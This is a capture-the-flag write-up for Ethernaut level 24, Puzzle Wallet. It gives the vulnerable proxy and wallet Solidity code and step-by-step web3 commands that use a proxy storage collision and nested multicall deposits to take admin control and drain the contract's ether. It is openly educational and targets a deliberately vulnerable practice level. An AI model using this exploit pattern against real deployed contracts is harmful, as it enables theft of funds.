---
description: delegatecall, proxy pattern, storage collision, and calldata encoding
---

# 24 - Puzzle Wallet (Hard)

Ethernaut Level24: [Puzzle Wallet](https://ethernaut.openzeppelin.com/level/0xb4B157C7c4b0921065Dded675dFe10759EecaA6D)

This level is very hard, \
so the explanation will be a bit longer here than other I did for other levels.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

### Goal of this level

* become the admin of the proxy

### What you should know

* `delegatecall`\
  ``-> [6 - Delegation](https://frenchkebab.gitbook.io/ctf-solutions/ethernaut/6-delegation) and [16 - Preservation](https://frenchkebab.gitbook.io/ctf-solutions/ethernaut/16-preservation)
* **Proxy Pattern**\
  \-> see [here](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies) and **here**
* function **selector**\
  \-> see [here](https://www.youtube.com/watch?v=Mn4e4w8h6n8)
* how **calldata** is encoded\
  \-> see [here](https://www.youtube.com/watch?v=70\_2YHJvKIc)

## Solution

<details>

<summary>Key to solve this problem 🔑</summary>

We will use **storage collision**.

<**`PuzzleProxy`**>\
slot0: `pendingAdmin`\
slot1: `admin`

<**`PuzzleWallet`**>\
slot0: `owner`\
slot1: `maxBalance`

First, We will set pendingAdmin to be our wallet address.

Then **`PuzzleWallet`** contract will read `pendingAdmin`(slot0 of **`PuzzleAdmin`**) instead of `owner`(slot0 of **`PuzzleWallet`**) when called from **`PuzzleProxy`** via `delegatecall`.

After that, we will update `admin`(slot1 of **`PuzzleProxy`**) to be our wallet address by updating `maxBalance`(slot1 of **`PuzzleWallet`**) using `delegatecall`.

</details>

### 0. Approach

You can skip this and go to **1.** if you want to read solution directly.

Our final goal is updating `admin` with our wallet address.

Since this level is using **Proxy Pattern** which uses `delegatecall`, apparently it seems we must exploit **Storage Collision**.

So we will try to update `maxBalance` to be our wallet address.

How can we do this?

```solidity
function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
  require(address(this).balance == 0, "Contract balance is not 0");
  maxBalance = _maxBalance; // here
}
```

It seems we should make the balance of the contract 0.

Again, how can we do this?

```solidity
function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
    require(balances[msg.sender] >= value, "Insufficient balance");
    balances[msg.sender] -= value;
    (bool success, ) = to.call{ value: value }(data); // here
    require(success, "Execution failed");
}
```

It seems we should have our wallet address whitelisted.

```solidity
function addToWhitelist(address addr) external {
    require(msg.sender == owner, "Not the owner");
    whitelisted[addr] = true;
}

```

To do this, we will have make `owner` store our wallet address for its value.

But don't forget!&#x20;

Everything is done via `delegatecall`.

So when addToWhitelist is called, it will refer to `slot0` of the **`PuzzleProxy`** when trying to access `owner`.

```solidity
function proposeNewAdmin(address _newAdmin) external {
    pendingAdmin = _newAdmin;
}
```

We can do this by calling this contract.

We just have to solve this in reverse order.

1\) update `slot0` to be `player` (our wallet address)

2\) add player to `whitelisted`

3\) reduce the balance of the contract to `0`

4\) update `slot1`&#x20;

### 1. Updating slot0

```javascript
// this will just pad 0s on the left to make it 32 bytes
> const playerEncoded = web3.eth.abi.encodeParameter("address", player); // 0x00...0<player address>
// '0x00000000000000000000000034b4ab0479d10fdbaa3b52c8371c7b1be5c73bb7'

> const proposeNewAdminSelector = web3.utils.keccak256("proposeNewAdmin(address)").substr(0, 10);
// '0xa6376746'

// we get rid of '0x' from playerEncoded
> await contract.sendTransaction({ data: proposeNewAdminSelector + playerEncoded.substr(2) });
```

We are sending transaction to **PuzzleProxy** with calldata:

```javascript
'0xa637674600000000000000000000000034b4ab0479d10fdbaa3b52c8371c7b1be5c73bb7'
```

If you wonder why we can't simply do like \
`await contract.proposeNewAdmin(player);`, see [here](https://stackoverflow.com/questions/73249245/ethernaut-level-24-puzzle-wallet-to-which-contract-the-wallet-object-on-the-b).

Simply speaking, it's because they created the Web3 contract object with the ABI of the logic contract(**`PuzzleWallet`**) with the address of the proxy contract(**`PuzzleProxy`**).

So the instance only recognizes code from **`PuzzleWallet`** (but in the context of **`PuzzleProxy`**).

So to check if slot0 is well updated, we should read the value of `owner`.\
(Again, the created instance does not recognize `pendingAdmin`)

```javascript
> await contract.owner();
'0x34B4ab0479D10FdbAA3b52C8371C7B1BE5c73bb7'
```

### 2. Adding player to whitelist

Now, let's add player to whitelist so we can call `execute` function to drain the contract so we can eventually update `maxBalance`.

```javascript
> await contract.addToWhitelist(player);

> await contract.whitelisted(player);
// true
```

Just to clarify, all storage variables (`owner`, `maxBalance`, `whitelisted`, and `balances`) are actually existing in **`PuzzleProxy`** contract.

Do not forget **`PuzzleWallet`** is just an Implementation Contract!

In Proxy Pattern, we use **Proxy Contract**'s storage!

### 3. Reducing the balance to 0

As just mentioned, the balance we are trying to reduce to 0 is actually balance of **`PuzzleProxy`** contract.

Let's check how much the contract has.

```javascript
> await web3.eth.getBalance(contract.address);
// '1000000000000000'
```

Our contract has `0.001` ether.

Now, let's drain that `0.001` eth.

```solidity
function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
    require(balances[msg.sender] >= value, "Insufficient balance");
    balances[msg.sender] -= value;
    (bool success, ) = to.call{ value: value }(data);
    require(success, "Execution failed");
}
```

In require statement it says `balances[player]` should be greater than or equal to the `value`.

It's currently 0, so can't we call deposit with `0.001` ether and make `balances[player]` to be `0.001` ether?

Unfortunately not, because even if we withdraw `0.001 ether`, **the initial** `0.001 ether` will still be remaining.



Now, the only thing left to use is `multicall`  function.



```solidity
function multicall(bytes[] calldata data) external payable onlyWhitelisted {
    bool depositCalled = false;
    for (uint256 i = 0; i < data.length; i++) {
        bytes memory _data = data[i];
        bytes4 selector;
        assembly {
            selector := mload(add(_data, 32))
        }
        if (selector == this.deposit.selector) {
            require(!depositCalled, "Deposit can only be called once");
            // Protect against reusing msg.value
            depositCalled = true;
        }
        (bool success, ) = address(this).delegatecall(data[i]);
        require(success, "Error while delegating call");
    }
}
```

`data` will be an array like \[calldata1, calldata2, calldata3, ...]



```solidity
bytes4 selector;
assembly {
    selector := mload(add(_data, 32))
}
if (selector == this.deposit.selector) {
    require(!depositCalled, "Deposit can only be called once");
    // Protect against reusing msg.value
    depositCalled = true;
}
```

It is checking if the first 4bytes of each calldata is selector of `deposit()` function. (`0xd0e30db0`)

And its preventing the transaction from calling `deposit()` multiple times.

It seems it's protecting against calling `deposit()` multiple times, but we should note that `depositCalled` is a **local variable**.

```solidity
(bool success, ) = address(this).delegatecall(data[i]);
```

Here, it is making a `delegatecall` to itself.

```
player -> PuzzleProxy -------------> PuzzleWallet -------------> PuzzleWallet
                       delegatecall                delegatecall                                    
```

So **`PuzzleWallet`**(Proxy) is calling **`PuzzelWallet`**(Implementation).

But originally **`PuzzleWallet`** itself was called as an Implementation as well.

So at the transaction will be using the **`PuzzleProxy's`** storage.



Within a single transaction calling `multicall`, we will do 3 things.

1. calling `deposit()`
2. calling another `multicall` from multicall(current transaction)\
   \-> this creates new context so new `depositCalled` will be created with `false` value.
3. call execute that withrdaws `0.002` ether.\
   (initial `0.001` and `0.001` that we just are sending now)

in 2. the inner `multicall` (`multicall` called from `multicall`) will run in the same  context (`msg.value: 0.001 ether`).

(This seems somewhat similar to reentrancy attack)

```javascript
> const deposit = (await contract.deposit.request()).data;
// '0xd0e30db0' -> selector of 'deposit()'

> const innerMulticall = (await contract.multicall.request([deposit])).data;
// multicall that calls deposit();

> const execute = (await contract.execute.request(player, web3.utils.toWei('0.002', 'ether'), [])).data;
// withdraw 0.002 ether
```



```javascript
> const multicallData = [deposit, innerMulticall, execute];

> await contract.multicall(multicallData, { value: web3.utils.toWei('0.001', 'ether')});
```

```javascript
> await web3.eth.getBalance(contract.address);
// '0'
```

Now, we successfully drained the contract.

Since we can pass the `require` condition `address(this).balance == 0`, what's left is updating `maxBalance` (slot1) to be `player` address!

### 4. Updating slot1

```javascript
> await contract.setMaxBalance(player);
```

Done! 😎

## Key Takeaways
